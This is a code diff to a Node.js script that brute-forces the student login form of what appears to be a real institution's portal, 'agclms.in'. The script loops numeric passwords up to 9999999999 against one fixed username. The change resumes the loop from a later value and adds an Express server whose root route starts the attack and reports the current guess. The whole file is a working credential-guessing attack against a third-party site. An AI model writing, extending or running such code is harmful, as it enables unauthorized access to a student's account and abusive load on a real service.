@@ -6,6 +6,9 @@ dotenv.config({
     path: './.env'
 });
 
+let i;
+
+let isInitiated;
 
 const username = 2412800;
 
@@ -20,8 +23,25 @@ async function connectDB() {
 }
 
 
+const express = require('express')
+const app = express()
+const port = 3000
+
+app.get('/', (req, res) => {
+  if(isInitiated) res.send(`initiated, current check ${i}`)
+  isInitiated = true;
+  main();
+  res.send('initiated')
+})
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`)
+})
+
+
+
 const main = async () => {
-    for (let i = 10239; i <= 9999999999; i++) {
+    for ( i = 14283; i <= 9999999999; i++) {
         const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
             method: "POST",
             mode: "cors",
@@ -66,5 +86,3 @@ const main = async () => {
 
 
 }
-
-main()
